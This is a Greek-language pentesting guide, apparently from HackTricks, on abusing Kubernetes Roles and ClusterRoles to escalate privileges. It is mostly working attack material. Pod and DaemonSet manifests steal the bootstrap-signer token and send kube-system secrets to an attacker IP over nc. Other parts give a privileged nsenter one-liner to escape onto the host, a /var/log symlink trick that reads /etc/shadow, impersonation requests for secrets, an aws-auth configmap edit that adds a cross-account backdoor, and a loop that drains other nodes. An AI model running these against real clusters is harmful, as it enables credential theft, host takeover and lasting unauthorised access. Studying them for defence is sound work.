# Abusing Roles/ClusterRoles in Kubernetes

{{#include ../../../banners/hacktricks-training.md}}

Εδώ μπορείτε να βρείτε κάποιες δυνητικά επικίνδυνες ρυθμίσεις Roles και ClusterRoles.\
Θυμηθείτε ότι μπορείτε να αποκτήσετε όλους τους υποστηριζόμενους πόρους με `kubectl api-resources`

## **Privilege Escalation**

Αναφερόμενος ως η τέχνη του να αποκτάς **πρόσβαση σε έναν διαφορετικό κύριο** εντός του cluster **με διαφορετικά προνόμια** (εντός του kubernetes cluster ή σε εξωτερικά cloud) από αυτά που ήδη έχετε, στο Kubernetes υπάρχουν βασικά **4 κύριες τεχνικές για την κλιμάκωση προνομίων**:

- Να είστε σε θέση να **παριστάνετε** άλλους χρήστες/ομάδες/SAs με καλύτερα προνόμια εντός του kubernetes cluster ή σε εξωτερικά cloud
- Να είστε σε θέση να **δημιουργείτε/διορθώνετε/εκτελείτε pods** όπου μπορείτε να **βρείτε ή να συνδέσετε SAs** με καλύτερα προνόμια εντός του kubernetes cluster ή σε εξωτερικά cloud
- Να είστε σε θέση να **διαβάζετε μυστικά** καθώς τα tokens των SAs αποθηκεύονται ως μυστικά
- Να είστε σε θέση να **διαφύγετε στον κόμβο** από ένα κοντέινερ, όπου μπορείτε να κλέψετε όλα τα μυστικά των κοντέινερ που εκτελούνται στον κόμβο, τα διαπιστευτήρια του κόμβου και τα δικαιώματα του κόμβου εντός του cloud στο οποίο εκτελείται (αν υπάρχει)
- Μια πέμπτη τεχνική που αξίζει να αναφερθεί είναι η ικανότητα να **τρέχετε port-forward** σε ένα pod, καθώς μπορεί να είστε σε θέση να αποκτήσετε πρόσβαση σε ενδιαφέροντες πόρους εντός αυτού του pod.

### Access Any Resource or Verb (Wildcard)

Η **wildcard (\*) δίνει άδεια σε οποιονδήποτε πόρο με οποιοδήποτε ρήμα**. Χρησιμοποιείται από τους διαχειριστές. Μέσα σε ένα ClusterRole αυτό σημαίνει ότι ένας επιτιθέμενος θα μπορούσε να εκμεταλλευτεί οποιοδήποτε namespace στο cluster
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Πρόσβαση σε οποιοδήποτε πόρο με μια συγκεκριμένη ρήτρα

Στο RBAC, ορισμένες άδειες ενέχουν σημαντικούς κινδύνους:

1. **`create`:** Παρέχει τη δυνατότητα δημιουργίας οποιουδήποτε πόρου του cluster, θέτοντας σε κίνδυνο την κλιμάκωση προνομίων.
2. **`list`:** Επιτρέπει την καταγραφή όλων των πόρων, ενδεχομένως διαρρέοντας ευαίσθητα δεδομένα.
3. **`get`:** Επιτρέπει την πρόσβαση σε μυστικά από λογαριασμούς υπηρεσιών, θέτοντας σε κίνδυνο την ασφάλεια.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

Ένας επιτιθέμενος με άδειες να δημιουργήσει ένα pod, θα μπορούσε να συνδέσει έναν προνομιούχο Λογαριασμό Υπηρεσίας στο pod και να κλέψει το token για να προσποιηθεί τον Λογαριασμό Υπηρεσίας. Αποτελεσματικά, κλιμακώνοντας τα προνόμια σε αυτόν.

Παράδειγμα ενός pod που θα κλέψει το token του λογαριασμού υπηρεσίας `bootstrap-signer` και θα το στείλει στον επιτιθέμενο:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Create & Escape

Το παρακάτω υποδεικνύει όλα τα δικαιώματα που μπορεί να έχει ένα κοντέινερ:

- **Προνομιακή πρόσβαση** (απενεργοποίηση προστασιών και ρύθμιση ικανοτήτων)
- **Απενεργοποίηση namespaces hostIPC και hostPid** που μπορούν να βοηθήσουν στην κλιμάκωση δικαιωμάτων
- **Απενεργοποίηση hostNetwork** namespace, δίνοντας πρόσβαση για κλοπή των προνομίων cloud των κόμβων και καλύτερη πρόσβαση σε δίκτυα
- **Σύνδεση hosts / μέσα στο κοντέινερ**
```yaml:super_privs.yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
Δημιουργήστε το pod με:
```bash
kubectl --token $token create -f mount_root.yaml
```
One-liner από [αυτό το tweet](https://twitter.com/mauilion/status/1129468485480751104) και με μερικές προσθήκες:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Τώρα που μπορείτε να διαφύγετε στον κόμβο, ελέγξτε τις τεχνικές μετά την εκμετάλλευση στο:

#### Stealth

Πιθανώς θέλετε να είστε **πιο διακριτικοί**. Στις επόμενες σελίδες μπορείτε να δείτε τι θα μπορούσατε να έχετε πρόσβαση αν δημιουργήσετε ένα pod ενεργοποιώντας μόνο ορισμένα από τα προαναφερθέντα δικαιώματα στο προηγούμενο πρότυπο:

- **Privileged + hostPID**
- **Privileged μόνο**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_Μπορείτε να βρείτε παραδείγματα για το πώς να δημιουργήσετε/εκμεταλλευτείτε τις προηγούμενες ρυθμίσεις privileged pods στο_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod Create - Move to cloud

Αν μπορείτε να **δημιουργήσετε** ένα **pod** (και προαιρετικά έναν **λογαριασμό υπηρεσίας**) μπορεί να είστε σε θέση να **αποκτήσετε δικαιώματα σε περιβάλλον cloud** αναθέτοντας **ρόλους cloud σε ένα pod ή σε έναν λογαριασμό υπηρεσίας** και στη συνέχεια να έχετε πρόσβαση σε αυτό.\
Επιπλέον, αν μπορείτε να δημιουργήσετε ένα **pod με το namespace δικτύου του host**, μπορείτε να **κλέψετε τον ρόλο IAM** της **περίπτωσης** του **κόμβου**.

Για περισσότερες πληροφορίες ελέγξτε:

{{#ref}}
pod-escape-privileges.md
{{#endref}}

### **Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs**

Είναι δυνατόν να εκμεταλλευτείτε αυτές τις άδειες για να **δημιουργήσετε ένα νέο pod** και να εδραιώσετε δικαιώματα όπως στο προηγούμενο παράδειγμα.

Το παρακάτω yaml **δημιουργεί ένα daemonset και εξάγει το token του SA** μέσα στο pod:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** είναι ένας πόρος στο kubernetes που χρησιμοποιείται για **την εκτέλεση εντολών σε ένα shell μέσα σε ένα pod**. Αυτό επιτρέπει να **εκτελούνται εντολές μέσα στα containers ή να αποκτάται πρόσβαση σε ένα shell μέσα**.

Επομένως, είναι δυνατόν να **μπείτε μέσα σε ένα pod και να κλέψετε το token του SA**, ή να εισέλθετε σε ένα προνομιούχο pod, να διαφύγετε στον κόμβο και να κλέψετε όλα τα tokens των pods στον κόμβο και (ab) να χρησιμοποιήσετε τον κόμβο:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Αυτή η άδεια επιτρέπει να **προωθείται μία τοπική θύρα σε μία θύρα στο συγκεκριμένο pod**. Αυτό προορίζεται για να διευκολύνει την αποσφαλμάτωση εφαρμογών που εκτελούνται μέσα σε ένα pod, αλλά ένας επιτιθέμενος μπορεί να το εκμεταλλευτεί για να αποκτήσει πρόσβαση σε ενδιαφέρουσες (όπως βάσεις δεδομένων) ή ευάλωτες εφαρμογές (ιστοσελίδες;) μέσα σε ένα pod:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Escape

Όπως [**υποδεικνύεται σε αυτή την έρευνα**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), αν μπορείτε να αποκτήσετε πρόσβαση ή να δημιουργήσετε ένα pod με το **hosts `/var/log/` directory mounted** σε αυτό, μπορείτε να **ξεφύγετε από το container**.\
Αυτό συμβαίνει βασικά επειδή όταν ο **Kube-API προσπαθεί να αποκτήσει τα logs** ενός container (χρησιμοποιώντας `kubectl logs <pod>`), **ζητά το αρχείο `0.log`** του pod χρησιμοποιώντας το `/logs/` endpoint της υπηρεσίας **Kubelet**.\
Η υπηρεσία Kubelet εκθέτει το `/logs/` endpoint το οποίο βασικά **εκθέτει το filesystem `/var/log` του container**.

Επομένως, ένας επιτιθέμενος με **πρόσβαση για εγγραφή στον φάκελο /var/log/** του container θα μπορούσε να εκμεταλλευτεί αυτή τη συμπεριφορά με 2 τρόπους:

- Τροποποιώντας το αρχείο `0.log` του container του (συνήθως βρίσκεται στο `/var/logs/pods/namespace_pod_uid/container/0.log`) ώστε να είναι ένα **symlink που δείχνει στο `/etc/shadow`** για παράδειγμα. Στη συνέχεια, θα μπορείτε να εξάγετε το αρχείο shadow των hosts κάνοντας:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
- Αν ο επιτιθέμενος ελέγχει οποιοδήποτε κύριο με τα **δικαιώματα να διαβάσει `nodes/log`**, μπορεί απλά να δημιουργήσει ένα **symlink** στο `/host-mounted/var/log/sym` προς `/` και όταν **πρόσβαση στο `https://<gateway>:10250/logs/sym/` θα καταγράψει το ριζικό** σύστημα αρχείων των hosts (η αλλαγή του symlink μπορεί να παρέχει πρόσβαση σε αρχεία).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Ένα εργαστήριο και αυτοματοποιημένη εκμετάλλευση μπορεί να βρεθεί στο** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Παράκαμψη προστασίας readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Αν είστε αρκετά τυχεροί και η πολύ προνομιούχος ικανότητα `CAP_SYS_ADMIN` είναι διαθέσιμη, μπορείτε απλά να ξανατοποθετήσετε τον φάκελο ως rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Όπως αναφέρεται σε [**αυτή την έρευνα**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), είναι δυνατόν να παρακαμφθεί η προστασία:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Ο οποίος προοριζόταν να αποτρέψει τις διαφυγές όπως οι προηγούμενες, χρησιμοποιώντας αντί για hostPath mount, ένα PersistentVolume και ένα PersistentVolumeClaim για να τοποθετήσει έναν φάκελο του host στο κοντέινερ με δικαιώματα εγγραφής:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: ["sh", "-c", "sleep 1h"]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Υποκατάσταση προνομιακών λογαριασμών**

Με ένα [**προνόμιο υποκατάστασης χρήστη**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), ένας επιτιθέμενος θα μπορούσε να υποκαταστήσει έναν προνομιακό λογαριασμό.

Απλά χρησιμοποιήστε την παράμετρο `--as=<username>` στην εντολή `kubectl` για να υποκαταστήσετε έναν χρήστη, ή `--as-group=<group>` για να υποκαταστήσετε μια ομάδα:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ή χρησιμοποιήστε το REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Listing Secrets

Η άδεια να **καταγράψει μυστικά θα μπορούσε να επιτρέψει σε έναν επιτιθέμενο να διαβάσει πραγματικά τα μυστικά** αποκτώντας πρόσβαση στο REST API endpoint:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Ανάγνωση ενός μυστικού – βίαιη επίθεση σε αναγνωριστικά token

Ενώ ένας επιτιθέμενος που κατέχει ένα token με δικαιώματα ανάγνωσης απαιτεί το ακριβές όνομα του μυστικού για να το χρησιμοποιήσει, σε αντίθεση με το ευρύτερο προνόμιο _**καταγραφής μυστικών**_, υπάρχουν ακόμα ευπάθειες. Οι προεπιλεγμένοι λογαριασμοί υπηρεσιών στο σύστημα μπορούν να απαριθμηθούν, καθένας από τους οποίους σχετίζεται με ένα μυστικό. Αυτά τα μυστικά έχουν μια δομή ονόματος: ένα στατικό πρόθεμα ακολουθούμενο από έναν τυχαίο αλφαριθμητικό κωδικό πέντε χαρακτήρων (εξαιρουμένων ορισμένων χαρακτήρων) σύμφωνα με τον [κώδικα πηγής](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Ο κωδικός παράγεται από ένα περιορισμένο σύνολο 27 χαρακτήρων (`bcdfghjklmnpqrstvwxz2456789`), αντί για το πλήρες αλφαριθμητικό εύρος. Αυτός ο περιορισμός μειώνει τον συνολικό αριθμό πιθανών συνδυασμών σε 14,348,907 (27^5). Ως εκ τούτου, ένας επιτιθέμενος θα μπορούσε να εκτελέσει μια βίαιη επίθεση για να deduce τον κωδικό σε λίγες ώρες, ενδεχομένως οδηγώντας σε κλιμάκωση προνομίων μέσω της πρόσβασης σε ευαίσθητους λογαριασμούς υπηρεσιών.

### Αιτήματα Υπογραφής Πιστοποιητικών

Εάν έχετε τα ρήματα **`create`** στον πόρο `certificatesigningrequests` (ή τουλάχιστον στο `certificatesigningrequests/nodeClient`). Μπορείτε να **δημιουργήσετε** ένα νέο CeSR ενός **νέου κόμβου.**

Σύμφωνα με την [τεκμηρίωση είναι δυνατή η αυτόματη έγκριση αυτών των αιτημάτων](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), οπότε σε αυτή την περίπτωση **δεν χρειάζεστε επιπλέον δικαιώματα**. Αν όχι, θα χρειαστεί να μπορείτε να εγκρίνετε το αίτημα, που σημαίνει ενημέρωση στο `certificatesigningrequests/approval` και `approve` στο `signers` με resourceName `<signerNameDomain>/<signerNamePath>` ή `<signerNameDomain>/*`

Ένα **παράδειγμα ρόλου** με όλες τις απαιτούμενες άδειες είναι:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Έτσι, με την έγκριση του νέου CSR κόμβου, μπορείτε να **καταχραστείτε** τις ειδικές άδειες των κόμβων για να **κλέψετε μυστικά** και να **κλιμακώσετε προνόμια**.

Στο [**αυτό το άρθρο**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) και [**σε αυτό**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) η διαμόρφωση TLS Bootstrap του GKE K8s είναι ρυθμισμένη με **αυτόματη υπογραφή** και καταχράται για να δημιουργήσει διαπιστευτήρια ενός νέου κόμβου K8s και στη συνέχεια να τα καταχραστεί για να κλιμακώσει προνόμια κλέβοντας μυστικά.\
Αν **έχετε τα αναφερόμενα προνόμια, μπορείτε να κάνετε το ίδιο**. Σημειώστε ότι το πρώτο παράδειγμα παρακάμπτει το σφάλμα που εμποδίζει έναν νέο κόμβο να έχει πρόσβαση σε μυστικά μέσα σε κοντέινερ, επειδή ένας **κόμβος μπορεί να έχει πρόσβαση μόνο στα μυστικά των κοντέινερ που είναι τοποθετημένα σε αυτόν.**

Ο τρόπος για να παρακάμψετε αυτό είναι απλώς να **δημιουργήσετε διαπιστευτήρια κόμβου για το όνομα του κόμβου όπου είναι τοποθετημένο το κοντέινερ με τα ενδιαφέροντα μυστικά** (αλλά απλώς ελέγξτε πώς να το κάνετε στο πρώτο άρθρο):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Οι φορείς που μπορούν να τροποποιήσουν **`configmaps`** στο namespace kube-system σε EKS (πρέπει να είναι σε AWS) κλάστερ μπορούν να αποκτήσουν δικαιώματα διαχειριστή του κλάστερ αντικαθιστώντας το **aws-auth** configmap.\
Οι ρήτρες που απαιτούνται είναι **`update`** και **`patch`**, ή **`create`** αν το configmap δεν έχει δημιουργηθεί:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
> [!WARNING]
> Μπορείτε να χρησιμοποιήσετε **`aws-auth`** για **persistency** δίνοντας πρόσβαση σε χρήστες από **άλλους λογαριασμούς**.
>
> Ωστόσο, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **δεν λειτουργεί από διαφορετικό λογαριασμό**. Αλλά στην πραγματικότητα, `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` λειτουργεί αν βάλετε το ARN του cluster αντί για απλώς το όνομα.\
> Για να λειτουργήσει το `kubectl`, απλώς βεβαιωθείτε ότι έχετε **ρυθμίσει** το **kubeconfig του θύματος** και στα args εκτέλεσης του aws προσθέστε `--profile other_account_role` ώστε το kubectl να χρησιμοποιεί το προφίλ του άλλου λογαριασμού για να αποκτήσει το token και να επικοινωνήσει με το AWS.

### Escalating in GKE

Υπάρχουν **2 τρόποι για να ανατεθούν άδειες K8s σε GCP principals**. Σε κάθε περίπτωση, ο principal χρειάζεται επίσης την άδεια **`container.clusters.get`** για να μπορέσει να συγκεντρώσει διαπιστευτήρια για να έχει πρόσβαση στο cluster, αλλιώς θα χρειαστεί να **δημιουργήσει το δικό του αρχείο ρυθμίσεων kubectl** (ακολουθήστε τον επόμενο σύνδεσμο).

> [!WARNING]
> Όταν μιλάτε με το K8s api endpoint, το **GCP auth token θα σταλεί**. Στη συνέχεια, το GCP, μέσω του K8s api endpoint, θα ελέγξει πρώτα αν ο **principal** (με email) **έχει πρόσβαση μέσα στο cluster**, στη συνέχεια θα ελέγξει αν έχει **πρόσβαση μέσω GCP IAM**.\
> Αν **οποιοδήποτε** από αυτά είναι **αληθές**, θα **απαντηθεί**. Αν **όχι**, θα δοθεί ένα **σφάλμα** που προτείνει να δοθούν **άδειες μέσω GCP IAM**.

Στη συνέχεια, η πρώτη μέθοδος είναι η χρήση **GCP IAM**, οι άδειες K8s έχουν τις **ισοδύναμες άδειες GCP IAM**, και αν ο principal τις έχει, θα μπορεί να τις χρησιμοποιήσει.

{{#ref}}
../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md
{{#endref}}

Η δεύτερη μέθοδος είναι **η ανάθεση αδειών K8s μέσα στο cluster** αναγνωρίζοντας τον χρήστη μέσω του **email** του (συμπεριλαμβανομένων των λογαριασμών υπηρεσιών GCP).

### Create serviceaccounts token

Principals που μπορούν να **δημιουργήσουν TokenRequests** (`serviceaccounts/token`) Όταν μιλούν με το K8s api endpoint SAs (πληροφορίες από [**εδώ**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)).

### ephemeralcontainers

Principals που μπορούν να **`update`** ή **`patch`** **`pods/ephemeralcontainers`** μπορούν να αποκτήσουν **εκτέλεση κώδικα σε άλλα pods**, και ενδεχομένως να **σπάσουν** στο node τους προσθέτοντας ένα ephemeral container με ένα privileged securityContext.

### ValidatingWebhookConfigurations or MutatingWebhookConfigurations

Principals με οποιοδήποτε από τα ρήματα `create`, `update` ή `patch` πάνω σε `validatingwebhookconfigurations` ή `mutatingwebhookconfigurations` μπορεί να είναι σε θέση να **δημιουργήσουν μία από αυτές τις webhookconfigurations** προκειμένου να μπορέσουν να **αναβαθμίσουν τις άδειες**.

Για ένα [`mutatingwebhookconfigurations` παράδειγμα ελέγξτε αυτή την ενότητα της ανάρτησης](./#malicious-admission-controller).

### Escalate

Όπως μπορείτε να διαβάσετε στην επόμενη ενότητα: [**Built-in Privileged Escalation Prevention**](./#built-in-privileged-escalation-prevention), ένας principal δεν μπορεί να ενημερώσει ούτε να δημιουργήσει ρόλους ή clusterroles χωρίς να έχει ο ίδιος αυτές τις νέες άδειες. Εκτός αν έχει το **ρήμα `escalate`** πάνω σε **`roles`** ή **`clusterroles`**.\
Τότε μπορεί να ενημερώσει/δημιουργήσει νέους ρόλους, clusterroles με καλύτερες άδειες από αυτές που έχει.

### Nodes proxy

Principals με πρόσβαση στο **`nodes/proxy`** υποπόρο μπορούν να **εκτελούν κώδικα σε pods** μέσω του Kubelet API (σύμφωνα με [**αυτό**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)). Περισσότερες πληροφορίες σχετικά με την αυθεντικοποίηση Kubelet σε αυτή τη σελίδα:

{{#ref}}
../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md
{{#endref}}

Έχετε ένα παράδειγμα για το πώς να αποκτήσετε [**RCE μιλώντας εξουσιοδοτημένα σε ένα Kubelet API εδώ**](../pentesting-kubernetes-services/#kubelet-rce).

### Delete pods + unschedulable nodes

Principals που μπορούν να **διαγράψουν pods** (`delete` ρήμα πάνω σε `pods` πόρο), ή **να εκδιώξουν pods** (`create` ρήμα πάνω σε `pods/eviction` πόρο), ή **να αλλάξουν την κατάσταση του pod** (πρόσβαση σε `pods/status`) και μπορούν **να κάνουν άλλα nodes unschedulable** (πρόσβαση σε `nodes/status`) ή **να διαγράψουν nodes** (`delete` ρήμα πάνω σε `nodes` πόρο) και έχουν έλεγχο σε ένα pod, θα μπορούσαν να **κλέψουν pods από άλλα nodes** ώστε να **εκτελούνται** στο **συμβιβασμένο** **node** και ο επιτιθέμενος μπορεί να **κλέψει τα tokens** από αυτά τα pods.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
### Κατάσταση υπηρεσιών (CVE-2020-8554)

Οι κύριοι που μπορούν να **τροποποιήσουν** **`services/status`** μπορεί να ρυθμίσουν το πεδίο `status.loadBalancer.ingress.ip` για να εκμεταλλευτούν το **μη διορθωμένο CVE-2020-8554** και να ξεκινήσουν **MiTM επιθέσεις κατά του clus**ter. Οι περισσότερες μετρήσεις για το CVE-2020-8554 αποτρέπουν μόνο τις υπηρεσίες ExternalIP (σύμφωνα με [**αυτό**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify_service_status_cve_2020_8554.rego)).

### Κατάσταση κόμβων και Pods

Οι κύριοι με **`update`** ή **`patch`** δικαιώματα πάνω σε `nodes/status` ή `pods/status`, θα μπορούσαν να τροποποιήσουν τις ετικέτες για να επηρεάσουν τους περιορισμούς προγραμματισμού που επιβάλλονται.

## Ενσωματωμένη Πρόληψη Κλιμάκωσης Δικαιωμάτων

Το Kubernetes διαθέτει έναν [ενσωματωμένο μηχανισμό](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) για την πρόληψη της κλιμάκωσης δικαιωμάτων.

Αυτό το σύστημα διασφαλίζει ότι **οι χρήστες δεν μπορούν να αυξήσουν τα δικαιώματά τους τροποποιώντας ρόλους ή δεσμεύσεις ρόλων**. Η επιβολή αυτού του κανόνα συμβαίνει σε επίπεδο API, παρέχοντας μια προστασία ακόμη και όταν ο RBAC authorizer είναι ανενεργός.

Ο κανόνας stipulates ότι ένας **χρήστης μπορεί να δημιουργήσει ή να ενημερώσει έναν ρόλο μόνο εάν κατέχει όλα τα δικαιώματα που περιλαμβάνει ο ρόλος**. Επιπλέον, το πεδίο των υφιστάμενων δικαιωμάτων του χρήστη πρέπει να ευθυγραμμίζεται με αυτό του ρόλου που προσπαθεί να δημιουργήσει ή να τροποποιήσει: είτε σε επίπεδο cluster για ClusterRoles είτε περιορισμένο στην ίδια namespace (ή σε επίπεδο cluster) για Roles.

> [!WARNING]
> Υπάρχει μια εξαίρεση στον προηγούμενο κανόνα. Εάν ένας κύριος έχει το **ρήμα `escalate`** πάνω σε **`roles`** ή **`clusterroles`** μπορεί να αυξήσει τα δικαιώματα των ρόλων και των clusterroles ακόμη και χωρίς να έχει τα δικαιώματα ο ίδιος.

### **Λάβετε & Ενημερώστε RoleBindings/ClusterRoleBindings**

> [!CAUTION]
> **Φαίνεται ότι αυτή η τεχνική λειτουργούσε πριν, αλλά σύμφωνα με τις δοκιμές μου δεν λειτουργεί πια για τον ίδιο λόγο που εξηγήθηκε στην προηγούμενη ενότητα. Δεν μπορείτε να δημιουργήσετε/τροποποιήσετε μια rolebinding για να δώσετε στον εαυτό σας ή σε έναν διαφορετικό SA κάποια δικαιώματα αν δεν έχετε ήδη.**

Το δικαίωμα να δημιουργήσετε Rolebindings επιτρέπει σε έναν χρήστη να **δεσμεύσει ρόλους σε έναν λογαριασμό υπηρεσίας**. Αυτό το δικαίωμα μπορεί δυνητικά να οδηγήσει σε κλιμάκωση δικαιωμάτων επειδή **επιτρέπει στον χρήστη να δεσμεύσει δικαιώματα διαχειριστή σε έναν συμβιβασμένο λογαριασμό υπηρεσίας.**

## Άλλες Επιθέσεις

### Εφαρμογή proxy sidecar

